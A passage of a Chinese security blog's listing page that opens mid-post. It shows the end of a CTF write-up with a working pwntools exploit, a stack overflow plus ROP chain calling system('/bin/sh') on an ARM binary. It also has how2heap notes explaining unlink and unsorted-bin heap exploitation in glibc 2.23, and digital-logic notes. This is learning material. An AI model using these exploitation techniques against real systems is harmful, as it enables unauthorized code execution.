<p><font face=汉仪唐美人>引用字符串<code>/bin/sh</code>的函数就是<code>system</code>函数。因此我们可以找到<code>system</code>函数的地址为0x10BA8。需要注意ARM架构函数的调用约定：<font color=red>前4个参数保存在R0~R3，之后的参数从右至左压栈。因此要想执行<code>system(&quot;/bin/sh&quot;)</code>，就需要将寄存器R0的值修改为字符串<code>'/bin/sh'</code>的地址，返回地址可以通过栈溢出直接修改。考虑到这是一个静态编译的文件，很容易就可以想到使用一个简单的ROP来实现寄存器修改操作。<font></font></p>
<p><img src="https://img-blog.csdnimg.cn/378e8f9963554d3d830236b7a57e83b2.png" alt="" /></p>
<p><font face=汉仪唐美人>找到合适的ROP地址为0x20904，可以在修改寄存器R0的值之后修改PC的值。现在可以编写exp了。</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;./typo&#x27;</span>])</span><br><span class="line">io.sendafter(<span class="string">b&#x27;quit\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">io.send(cyclic(<span class="number">0x70</span>) + p32(<span class="number">0x20904</span>) + p32(<span class="number">0x6c384</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x10ba8</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/67fef56492dc496c840ced2ad8631fda.png" alt="" /></p>
<p><font face=汉仪唐美人>成功getshell。这题看来不难，只是一个简单的不能再简单的ROP。</font></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-5/" class="post-title-link" itemprop="url">how2heap 深入学习(5)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:28:16 / Modified: 22:54:19" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:16+08:00">2023-02-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/glibc-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">glibc 系列</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>how2heap下载网址: <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap">传送门</a><br />
Glibc源码查看网址：<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source">传送门</a><br />
参考书籍：CTF竞赛权威指南-pwn篇</p>
<p>测试环境：Ubuntu 16.04<br />
Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p>
<p>按照顺序，本文分析glibc 2_23文件夹中的第17~19个源码，这也是glibc 2.23 how2heap给出的最后3个源码。<br />
如果本文的分析有任何错漏之处，还请各位读者不吝赐教，不胜感激。</p>
<h1 id="17-unsafe_unlink"><a class="markdownIt-Anchor" href="#17-unsafe_unlink"></a> 17. unsafe_unlink</h1>
<p>众所周知，unlink是一种常用的堆漏洞利用方式，最为常见的利用场景是可以进行unlink而且堆指针保存在全局变量中。（例题：XCTF攻防世界-Noleak）</p>
<p>这种漏洞利用方式不是借助于fastbin完成，因此需要申请较大的堆块。在源码中定义了一个全局变量chunk0_ptr，为其分配了一个大小为0x90的堆块。之后又分配了一个0x90堆块chunk1_ptr，这也是接下来被攻击的chunk。设第一个chunk的起始地址为x，全局变量的地址为y，现在的内存情况如下：</p>
<table>
<thead>
<tr>
<th style="text-align:center">addr</th>
<th style="text-align:center">+0x0</th>
<th style="text-align:center">+0x8</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">x</td>
<td style="text-align:center">-</td>
<td style="text-align:center">(size) 0x91</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">x + 0x90</td>
<td style="text-align:center">-</td>
<td style="text-align:center">(size) 0x91</td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">y</td>
<td style="text-align:center">x</td>
<td style="text-align:center">-</td>
</tr>
</tbody>
</table>
<p>接下来，我们需要在chunk0_ptr的chunk中伪造一个chunk，为接下来的unlink做准备。伪造后的堆区长这样：</p>
<table>
<thead>
<tr>
<th style="text-align:center">addr</th>
<th style="text-align:center">+0x0</th>
<th style="text-align:center">+0x8</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">x</td>
<td style="text-align:center">-</td>
<td style="text-align:center">(size) 0x91</td>
</tr>
<tr>
<td style="text-align:center">x+0x10</td>
<td style="text-align:center">-</td>
<td style="text-align:center">-</td>
</tr>
<tr>
<td style="text-align:center">x+0x20</td>
<td style="text-align:center"><font color=red>(fake chunk fd) y-0x18</font></td>
<td style="text-align:center"><font color=red>(fake chunk bk) y-0x10</font></td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
<tr>
<td style="text-align:center">x+0x90</td>
<td style="text-align:center"><font color=red>(fake prev size) 0x80</font></td>
<td style="text-align:center"><font color=red>(size) 0x90</font></td>
</tr>
<tr>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
<td style="text-align:center">…</td>
</tr>
</tbody>
</table>
<p>注意：这里将第二个chunk的prev_in_use位修改为了0，fake prev size就是假chunk的大小，将fake prev size设为0x80是为了让后面一个chunk能够通过prev chunk找到我们构造的假chunk。fake chunk的假fd和bk指针的构造很重要，后面会用到。</p>
<p>接下来，我们将第二个chunk释放，释放时第二个chunk会和第一个chunk里面的假chunk合并。这样就造成了堆块的重叠。</p>
<p>下面解释一下为什么这之后能够进行任一地址写。</p>
<h2 id="为什么要设置fdy-0x18bky-0x10"><a class="markdownIt-Anchor" href="#为什么要设置fdy-0x18bky-0x10"></a> 为什么要设置fd=y-0x18，bk=y-0x10？</h2>
<p>这是为了绕过libc的检查。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;								      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;								      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;								      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;							      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;							      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)				      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span></span><br><span class="line"><span class="meta">	    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span></span><br><span class="line"><span class="meta">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">	      malloc_printerr (check_action,				      \</span></span><br><span class="line"><span class="meta">			       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span></span><br><span class="line"><span class="meta">			       P, AV);					      \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;				      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)				      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span></span><br><span class="line"><span class="meta">                  &#125;							      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;							      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span></span><br><span class="line"><span class="meta">              &#125;								      \</span></span><br><span class="line"><span class="meta">          &#125;								      \</span></span><br><span class="line"><span class="meta">      &#125;									      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure>
<p>在unlink的源码中有一个检查是：<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)</code>。因此需要保证此chunk的fd的bk等于bk的fd等于此chunk。由于C语言按照偏移获取结构体的成员，fd的偏移为0x10，bk的偏移为0x18。在全局变量中保存的就是第一个chunk，将fd指向y-0x18，那么fd-&gt;bk就为y；将bk指向y-0x10，那么bk-&gt;fd就为y。y中保存的正好就是x，这也就成功绕过了检查。检查通过之后，heap会进行堆块的合并操作，同时修改全局变量指针的值。</p>
<p>因为P = x，FD = y - 0x18，BK = y - 0x10，在语句<code>BK-&gt;fd = FD;</code>执行之后，全局变量的chunk0_ptr的值就变成了y-0x18。这样，我们就可以通过chunk0_ptr对其本身进行修改，此时可将chunk0_ptr的值修改为任意值。<font color=red>注意：不要被绕晕了，这个时候，全局变量保存的不再是第一个chunk的起始地址，而是通过unlink操作被修改了，但是libc误认为这里仍然保存的是一个chunk的指针，因此可以让这个全局变量自己修改自己。</font>在源码中，将这里修改到了栈区，之后再次使用这个指针就可以修改栈区的内容了。</p>
<h1 id="18-unsorted_bin_attack"><a class="markdownIt-Anchor" href="#18-unsorted_bin_attack"></a> 18. unsorted_bin_attack</h1>
<p>这种攻击方式实际上在前面已经提到过，比较简单。将第一个unsorted bin chunk的bk指针修改为我们想要写的地址附近，然后把这个chunk分配回去就能够让unsorted bin head指向我们想要的地址，然后再调用malloc函数就能分配一块内存到我们想要的地址了。</p>
<h1 id="19-unsorted_bin_into_stack"><a class="markdownIt-Anchor" href="#19-unsorted_bin_into_stack"></a> 19. unsorted_bin_into_stack</h1>
<p>也是unsorted bin attack。首先分配两个0x110的chunk，后一个防止top chunk影响。然后释放第一个chunk。接下来在堆块中伪造一个chunk，设置size为0x110，bk为这个假堆块头。接下来是漏洞关键操作：修改第一个chunk的size和bk。程序将第一个chunk的size改小为0x20，bk改为假chunk。将size改小是为了后面分配0x100大小的堆块时能够跳过这个堆块直接分配到栈上的假chunk。</p>
<p>后面调用malloc函数时，首先从unsorted bin中查找到了第一个chunk。但是因为这个chunk的大小被改小了，libc判定空间不足，就将这个chunk移到了small bins中。之后检查到了假chunk并将其返回。既然chunk已经分配到了栈上，那么就可以直接修改main函数的返回地址（如果有canary可能不能直接修改）并劫持控制流。</p>
<p>至此，how2heap glibc 2.23的所有源码已经分析完成。之后会进行glibc 2.27源码的分析。实际上glibc 2.23和2.27的最大区别就是tcache。其他方面区别不大，因此glibc 2.27的分析可能会短很多。实际上，在分析调试how2heap源码中，有很多地方仍然没有深入到原子操作去进行。待到我的水平再上一层时可能会来解决这一部分问题。但现在，所有给出的堆漏洞已经了解其利用方法，通过做题可以加深我们对漏洞利用方式的判断与应用。谢谢。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-3%E2%80%94%E2%80%94%E9%97%A8%E7%94%B5%E8%B7%AF%E5%92%8C%E8%A7%A6%E5%8F%91%E5%99%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-3%E2%80%94%E2%80%94%E9%97%A8%E7%94%B5%E8%B7%AF%E5%92%8C%E8%A7%A6%E5%8F%91%E5%99%A8/" class="post-title-link" itemprop="url">数字逻辑 Chapter 3——门电路和触发器</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-28 22:28:15 / Modified: 22:28:16" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:15+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="3-1-数字集成电路分类"><a href="#3-1-数字集成电路分类" class="headerlink" title="3.1 数字集成电路分类"></a>3.1 数字集成电路分类</h1><p>集成电路进行数字系统设计的优点：可靠性高、可维护性好、功耗低、成本低等<br>数字集成电路根据采用的半导体期间可以分为两类：</p>
<ol>
<li>双极型集成电路：采用双极型半导体期间作为元件。特点：速度快、负载能力强，但功耗较大、集成度较低。</li>
<li>单极型集成电路(MOS)：采用金属、一氧化物半导体场效应管作为元件。特点：结构简单、制造方便、集成度高、功耗低，但速度较慢</li>
</ol>
<h1 id="3-2-半导体期间开关特性"><a href="#3-2-半导体期间开关特性" class="headerlink" title="3.2 半导体期间开关特性"></a>3.2 半导体期间开关特性</h1><h2 id="3-2-1-晶体二极管"><a href="#3-2-1-晶体二极管" class="headerlink" title="3.2.1 晶体二极管"></a>3.2.1 晶体二极管</h2><p>正向特性：有门槛电压，即二极管开始导通的正向电压，又称阈值电压。<br>反向特性：在反向电压作用下处于截止状态，反向电阻大，相当于断开。</p>
<h2 id="3-2-2-晶体三极管"><a href="#3-2-2-晶体三极管" class="headerlink" title="3.2.2 晶体三极管"></a>3.2.2 晶体三极管</h2><p>截止、放大、饱和3种状态。</p>
<h1 id="3-3-逻辑门电路"><a href="#3-3-逻辑门电路" class="headerlink" title="3.3 逻辑门电路"></a>3.3 逻辑门电路</h1><h2 id="3-3-1-简单逻辑门电路"><a href="#3-3-1-简单逻辑门电路" class="headerlink" title="3.3.1 简单逻辑门电路"></a>3.3.1 简单逻辑门电路</h2><ol>
<li>与门<br><img src="https://img-blog.csdnimg.cn/6d020de8ccee4fa09ed3399b22af9541.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_19,color_FFFFFF,t_70,g_se,x_16"></li>
<li>或门</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/cd1bb4e99ce245719a97b3d326214998.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>3. 非门</p>
<p><img src="https://img-blog.csdnimg.cn/180d7b1cebd346b8aac755f2be93b748.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_18,color_FFFFFF,t_70,g_se,x_16"></p>
<h2 id="3-3-2-TTL集成逻辑门电路和CMOS电路"><a href="#3-3-2-TTL集成逻辑门电路和CMOS电路" class="headerlink" title="3.3.2 TTL集成逻辑门电路和CMOS电路"></a>3.3.2 TTL集成逻辑门电路和CMOS电路</h2><p>TTL功耗大、集成度低，广泛用户中小规模集成电路中<br>常用TTL集成电路芯片有74系列</p>
<p>两种特殊门电路：</p>
<ol>
<li>集电极开路门(OC门)<br> 一种输出端可以直接相互连接的特殊逻辑门，可以实现“线与”逻辑<br><img src="https://img-blog.csdnimg.cn/8659ff2637d04c90b5e436f0fdfc1f8b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_19,color_FFFFFF,t_70,g_se,x_16"></li>
<li>三态输出门(TS门)<br> 常用于数字系统中总线传输控制，可以让共享总线的输入输出设备根据控制信号从总线获取或向总线发送数据<br> 三种输出状态：高电平、低电平、高阻</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/065e8e538d2c4f90b422f5f6c9bc68fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>正逻辑与负逻辑<br>正逻辑：用高电平表示逻辑1<br>负逻辑：用低电平表示逻辑1</p>
<h1 id="3-4-触发器"><a href="#3-4-触发器" class="headerlink" title="3.4 触发器"></a>3.4 触发器</h1><p>触发器：一种具有记忆功能的电子器件，用于存储一位二进制信息<br>特点：</p>
<ul>
<li>有两个互补的输出端$Q,\bar Q$</li>
<li>有两个稳定状态，$Q&#x3D;1,\bar Q&#x3D;0$称为“1”状态，否则称为“0”状态。输入信号不变时，触发器状态稳定不变</li>
<li>在一定输入信号作用下，触发器可以从一个稳定状态转移到另一个稳定状态</li>
<li>输出状态不仅与现时输入有关，还与原来输出状态有关</li>
<li>按功能分类：RS型触发器、D型触发器、T型触发器、JK型触发器等</li>
</ul>
<p>现态：$Q^n,\bar{Q^n}$，简记为$Q,\bar Q$<br>次态：$Q^{n+1},\bar Q^{n+1}$</p>
<h2 id="3-4-1-基本R-S触发器"><a href="#3-4-1-基本R-S触发器" class="headerlink" title="3.4.1 基本R-S触发器"></a>3.4.1 基本R-S触发器</h2><p><img src="https://img-blog.csdnimg.cn/69e22b3482704f55ab38a0d0650d3e0f.png"></p>
<p>功能表：</p>
<table>
<thead>
<tr>
<th align="center">R</th>
<th align="center">S</th>
<th align="center">功能</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">1</td>
<td align="center">不变</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">0</td>
<td align="center">次态为1</td>
</tr>
<tr>
<td align="center">0</td>
<td align="center">1</td>
<td align="center">现态为0</td>
</tr>
<tr>
<td align="center">0</td>
<td align="center">0</td>
<td align="center">不定（不允许）</td>
</tr>
</tbody></table>
<p><font color=red>输出方程：$Q^{n+1}&#x3D;\bar S+RQ$</font><br>约束方程：$R+S&#x3D;1$</p>
<p>基本R-S触发器在RS不同时实现的是赋值功能，赋R的值。</p>
<h2 id="3-4-2-常用的几种时钟控制触发器"><a href="#3-4-2-常用的几种时钟控制触发器" class="headerlink" title="3.4.2 常用的几种时钟控制触发器"></a>3.4.2 常用的几种时钟控制触发器</h2><h3 id="1-钟控R-S触发器"><a href="#1-钟控R-S触发器" class="headerlink" title="1. 钟控R-S触发器"></a>1. 钟控R-S触发器</h3><p><img src="https://img-blog.csdnimg.cn/2c567c1e7abc403bad6b71cbe46c6636.png"></p>
<p>当$CP&#x3D;0$时，$Q$状态不变<br>当$CP&#x3D;1$时，R-S输入功能表与基本R-S触发器功能表相反。</p>
<p><font color=red>输出方程：$Q^{n+1}&#x3D;S+\bar RQ$</font><br>约束方程：$RS&#x3D;0$</p>
<p>激励表：<br><img src="https://img-blog.csdnimg.cn/062aec0250c246feaca588884af80018.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_10,color_FFFFFF,t_70,g_se,x_16"></p>
<h3 id="2-钟控D触发器"><a href="#2-钟控D触发器" class="headerlink" title="2. 钟控D触发器"></a>2. 钟控D触发器</h3><p><img src="https://img-blog.csdnimg.cn/778ee0b80ba34d018010ad69d8494d64.png"></p>
<p>实际上就是将R-S触发器的S换成了D，R换成了~D。因此D输入什么就储存什么。</p>
<p><font color=red>输出方程：$Q^{n+1}&#x3D;D$</font></p>
<h3 id="3-钟控J-K触发器"><a href="#3-钟控J-K触发器" class="headerlink" title="3. 钟控J-K触发器"></a>3. 钟控J-K触发器</h3><p><img src="https://img-blog.csdnimg.cn/568b8bddea054bdf94bec75e6fb51ec1.png"></p>
<p>实际上就是相较于钟控R-S触发器添加了JK端均为1的处理：反转。JK端输入不同时赋J的值。</p>
<p><font color=red>输出方程：$Q^{n+1}&#x3D;J\bar Q+\bar KQ$</font></p>
<h3 id="4-钟控T触发器"><a href="#4-钟控T触发器" class="headerlink" title="4. 钟控T触发器"></a>4. 钟控T触发器</h3><p><img src="https://img-blog.csdnimg.cn/5a974f0d796b40ac808748491df27f66.png"></p>
<p>即将钟控J-K触发器的JK端接在一起。T&#x3D;1反转，T&#x3D;0不变</p>
<h2 id="3-4-3-主从R-S触发器"><a href="#3-4-3-主从R-S触发器" class="headerlink" title="3.4.3 主从R-S触发器"></a>3.4.3 主从R-S触发器</h2><p>空翻现象：在一个时钟周期内触发器发生2次及以上的变化，会造成系统状态的不稳定和工作的紊乱。<br>主从R-S触发器可以看做两个R-S触发器串联形成，这两个触发器的时钟信号互补。当主触发器解锁时，其信号变化对从触发器无影响。<br>从触发器的状态取决于主触发器解锁到锁定最后一课的状态，根据此状态设定从触发器。因此整个触发器输出信号只可能在时钟信号由1变为0时改变，提升了系统的同步性。</p>
<ol>
<li>主从R-S触发器<br><img src="https://img-blog.csdnimg.cn/021f8beff0b54d6fab794b03eaaee8d1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></li>
</ol>
<p>其中$R_D,S_D$为直接清零端和直接置1端，一般情况下为高电平，为低电平时可以直接为从触发器强制赋值。</p>
<ol start="2">
<li>主从J-K触发器<br>在主从R-S触发器的基础上，加从$\bar Q$到主触发器S端的反馈与从Q到R端的反馈：R&#x3D;K，S&#x3D;J</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/556b852f79be4be2a208fd3edd0c7a64.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<ol start="3">
<li>典型维持：阻塞D触发器<br>钟控D触发器的改进版，只在时钟信号由0变成1（称上升沿）时读取D信号并设置触发器状态，其余时间Q不变</li>
</ol>
<p><img src="https://img-blog.csdnimg.cn/ce0afbe7408a405d8860a3b5120afd08.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">79</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">categories</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
